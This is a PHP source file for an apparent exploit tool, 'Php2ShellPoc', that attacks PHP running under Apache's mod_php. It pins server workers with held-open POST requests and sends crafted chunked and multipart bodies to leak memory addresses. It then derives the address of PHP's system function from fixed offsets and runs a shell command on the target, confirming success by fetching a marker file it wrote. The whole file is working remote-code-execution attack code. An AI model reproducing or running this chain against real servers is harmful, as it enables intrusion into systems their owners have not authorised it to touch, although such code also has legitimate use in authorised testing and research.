<?php

declare(strict_types=1);

namespace Php2ShellTui\Poc;

use Php2ShellTui\Http\Client;
use Php2ShellTui\Target;

final class Php2ShellPoc
{
    private const DEFAULT_A1_QUERY = 'q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v';
    private const DELTA_MIN = 0x1A00000;
    private const DELTA_MAX = 0x1F00000;
    private const CONTENT_TYPE = 'multipart/form-data; boundary=CCCCCCCCCC';

    public function __construct(
        private readonly ?PayloadBuilder $builder = null,
        private readonly ?Client $client = null,
        private readonly int $timeout = 180,
        private readonly int $maxWorkers = 150,
    ) {
    }

    public function stage1(Target $target, Profile $profile): PocResult
    {
        return $this->execute($target, $profile, false);
    }

    public function run(Target $target, Profile $profile): PocResult
    {
        return $this->execute($target, $profile, true);
    }

    private function execute(Target $target, Profile $profile, bool $full): PocResult
    {
        if (!$profile->rceVerified()) {
            return new PocResult(false, 'profile is not verified');
        }

        if (strtolower($profile->sapi()) !== 'apache2handler') {
            return new PocResult(false, 'the verified chain is mod_php only');
        }

        $parts = parse_url($target->url);
        $scheme = strtolower((string) ($parts['scheme'] ?? ''));
        $host = (string) ($parts['host'] ?? '');

        if (!in_array($scheme, ['http', 'https'], true) || $host === '') {
            return new PocResult(false, 'target URL is not a supported HTTP URL');
        }

        if ($full && $this->client === null) {
            return new PocResult(false, 'proof client is not configured');
        }

        $workers = max(1, $profile->workers());

        if ($workers > $this->maxWorkers) {
            return new PocResult(false, sprintf('worker cap exceeded (%d > %d)', $workers, $this->maxWorkers));
        }

        if ($workers > 1 && function_exists('posix_getrlimit')) {
            $limits = posix_getrlimit();
            $soft = $limits['openfiles_soft'] ?? null;

            if (is_numeric($soft) && (int) $soft > 0 && $workers + 20 > (int) $soft) {
                return new PocResult(false, sprintf('local file-descriptor budget is too small for %d holders', $workers - 1));
            }
        }

        $deadline = microtime(true) + max(1, $this->timeout);
        $port = (int) ($parts['port'] ?? ($scheme === 'https' ? 443 : 80));
        $path = $target->postPath ?? (string) ($parts['path'] ?? '/');
        $path = $path !== '' ? $path : '/';

        $stages = $profile->stages();
        $offsets = $profile->offsets();
        $a1Big = self::stageInt($stages, 'a1_big', 78);
        $a1Query = (string) ($stages['a1_query'] ?? self::DEFAULT_A1_QUERY);
        $b1FakeLen = self::stageInt($stages, 'b1_fake_len', 0xC8000);
        $b1Spec = isset($stages['b1_spec']) && is_string($stages['b1_spec']) ? $stages['b1_spec'] : null;
        $zvalOffset = self::hexInt($offsets['zval_ptr_dtor'] ?? 0x65EB60);
        $zifOffset = self::hexInt($offsets['zif_system'] ?? 0x465370);
        $mainSOffset = self::stageInt($stages, 'main_s_offset', 0xF8398);
        $a2Parts = self::stageInt($stages, 'a2_parts', 880);
        $a2Depth = self::stageInt($stages, 'a2_depth', 64);
        $a2Fillers = self::stageInt($stages, 'a2_fillers', 115);
        $b2Vl = self::stageInt($stages, 'b2_vl', 384);
        $b2N1 = self::stageInt($stages, 'b2_n1', 500);
        $b2N2 = self::stageInt($stages, 'b2_n2', 495);
        $carrierSize = self::stageInt($stages, 'carrier_size', 384);
        $mainBucketCount = self::stageInt($stages, 'main_bucket_count', 87);
        $deltaMin = self::stageInt($stages, 'delta_min', self::DELTA_MIN);
        $deltaMax = self::stageInt($stages, 'delta_max', self::DELTA_MAX);

        $proofFile = null;
        $proofCandidates = [];
        $marker = $full ? self::marker() : '';

        if ($full) {
            $proofFile = ProofPath::randomFile();
            $proofCandidates = ProofPath::candidates($path, $proofFile);
            $free = false;

            for ($attempt = 0; $attempt < 5; $attempt++) {
                $allFree = true;

                foreach ($proofCandidates as $candidate) {
                    $response = $this->client?->get(self::origin($scheme, $host, $port) . $candidate, $target->requestHeaders());

                    if ($response === null || $response->getStatusCode() !== 404) {
                        $allFree = false;
                        break;
                    }
                }

                if ($allFree) {
                    $free = true;
                    break;
                }

                $proofFile = ProofPath::randomFile();
                $proofCandidates = ProofPath::candidates($path, $proofFile);
            }

            if (!$free) {
                return new PocResult(false, 'proof paths are not free');
            }
        }

        $raw = null;
        $a1 = null;
        $b1 = null;
        $a2 = null;
        $b2 = null;

        try {
            $raw = new RawHttp($scheme, $host, $port, (float) $this->timeout, $target->requestHeaders());
            $holders = 0;

            if ($workers > 1) {
                for ($i = 0; $i < $workers - 1; $i++) {
                    try {
                        $raw->openIncompletePost($path, 1048576);
                        $holders++;
                        usleep(10_000);
                    } catch (\Throwable) {
                        break;
                    }
                }

                if ($holders < $workers - 1) {
                    return new PocResult(false, sprintf('worker pinning failed (%d/%d holders)', $holders, $workers - 1));
                }

                usleep(800_000);
            }

            if (microtime(true) > $deadline) {
                return new PocResult(false, 'PoC deadline exceeded before stage 1');
            }

            $builder = $this->builder ?? new PayloadBuilder();
            $a1 = tempnam(sys_get_temp_dir(), 'p2s-a1-');
            $b1 = tempnam(sys_get_temp_dir(), 'p2s-b1-');

            if ($a1 === false || $b1 === false) {
                return new PocResult(false, 'cannot create the stage-1 payload files');
            }

            $builder->a1($a1, $a1Big);

            $a1Path = $path . (str_contains($path, '?') ? '&' : '?') . $a1Query;
            $raw->sendChunked($a1Path, $a1);
            usleep(200_000);

            if (microtime(true) > $deadline) {
                return new PocResult(false, 'PoC deadline exceeded before the leak request');
            }

            $builder->b1($b1, $b1FakeLen, true, $b1Spec);
            $response = $raw->sendChunked($path, $b1);

            $leak = LeakParser::parse($response, $zvalOffset, $mainBucketCount);
            $main = $leak['main_candidates'][0] ?? null;

            if ($main === null) {
                return new PocResult(false, 'stage 1 leak has no main-chunk candidate');
            }

            $delta = $leak['libphp'] - $main;

            if ($delta < $deltaMin || $delta > $deltaMax) {
                return new PocResult(false, sprintf('stage 1 leak has an implausible libphp-main delta 0x%x', $delta));
            }

            $leakEvidence = [
                'decoded' => $leak['decoded'],
                'zval_ptr_dtor' => sprintf('0x%x', $leak['zval_ptr_dtor']),
                'libphp' => sprintf('0x%x', $leak['libphp']),
                'main' => sprintf('0x%x', $main),
                'delta' => sprintf('0x%x', $delta),
                'main_candidates' => array_map(static fn (int $p): string => sprintf('0x%x', $p), $leak['main_candidates']),
                'candidate_counts' => $leak['candidate_counts'],
            ];

            if (!$full) {
                return new PocResult(
                    confirmed: false,
                    reason: 'stage 1 leak validated',
                    evidence: json_encode($leakEvidence, JSON_THROW_ON_ERROR),
                );
            }

            $zif = $leak['libphp'] + $zifOffset;
            $s = $main + $mainSOffset;
            $command = 'echo ' . $marker . '>' . $proofFile;
            $carrier = $builder->stage3Carrier($s, $zif, $command, $carrierSize);

            $a2 = tempnam(sys_get_temp_dir(), 'p2s-a2-');
            $b2 = tempnam(sys_get_temp_dir(), 'p2s-b2-');

            if ($a2 === false || $b2 === false) {
                return new PocResult(false, 'cannot create the stage-3 payload files');
            }

            if (microtime(true) > $deadline) {
                return new PocResult(false, 'PoC deadline exceeded before stage 3');
            }

            $builder->a2($a2, $a2Parts, $a2Depth, $a2Fillers);
            $raw->sendBody($path, $a2, self::CONTENT_TYPE);
            usleep(200_000);

            if (microtime(true) > $deadline) {
                return new PocResult(false, 'PoC deadline exceeded before the carrier request');
            }

            $builder->b2($b2, $carrier, $s, $b2Vl, $b2N1, $b2N2);
            $raw->sendBody($path, $b2, self::CONTENT_TYPE);

            usleep(600_000);

            $evidenceBase = [
                'profile' => $profile->id(),
                'leak' => $leakEvidence,
                'proof_file' => $proofFile,
                'proof_candidates' => $proofCandidates,
                'marker' => $marker,
            ];

            foreach ($proofCandidates as $candidate) {
                $proofUrl = self::origin($scheme, $host, $port) . $candidate;
                $proof = $this->client?->get(
                    $proofUrl . '?p2s=' . bin2hex(random_bytes(4)),
                    $target->requestHeaders(),
                );

                if ($proof === null || $proof->getStatusCode() !== 200) {
                    continue;
                }

                if (trim((string) $proof->getBody()) !== $marker) {
                    continue;
                }

                return new PocResult(
                    confirmed: true,
                    reason: 'RCE confirmed on the target',
                    proof: $marker,
                    evidence: json_encode($evidenceBase + ['proof_url' => $proofUrl], JSON_THROW_ON_ERROR),
                    proofPath: $proofUrl,
                );
            }

            return new PocResult(
                confirmed: false,
                reason: 'RCE proof not retrievable from the candidate paths',
                evidence: json_encode($evidenceBase, JSON_THROW_ON_ERROR),
            );
        } catch (\Throwable $e) {
            return new PocResult(false, ($full ? 'stage 3' : 'stage 1') . ' failed: ' . $e->getMessage());
        } finally {
            if ($raw !== null) {
                $raw->close();
            }

            foreach ([$a1, $b1, $a2, $b2] as $pathToDelete) {
                if (is_string($pathToDelete)) {
                    @unlink($pathToDelete);
                }
            }
        }
    }

    /**
     * @param array<string, mixed> $stages
     */
    private static function stageInt(array $stages, string $key, int $default): int
    {
        if (!array_key_exists($key, $stages)) {
            return $default;
        }

        return is_int($stages[$key]) ? $stages[$key] : (int) intval((string) $stages[$key], 0);
    }

    private static function hexInt(mixed $value): int
    {
        return is_int($value) ? $value : (int) intval((string) $value, 0);
    }

    private static function origin(string $scheme, string $host, int $port): string
    {
        if (str_contains($host, ':') && !str_starts_with($host, '[')) {
            $host = '[' . $host . ']';
        }

        return sprintf('%s://%s:%d', $scheme, $host, $port);
    }

    private static function marker(): string
    {
        $alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        $marker = '';

        for ($i = 0; $i < 7; $i++) {
            $marker .= $alphabet[random_int(0, strlen($alphabet) - 1)];
        }

        return $marker;
    }
}
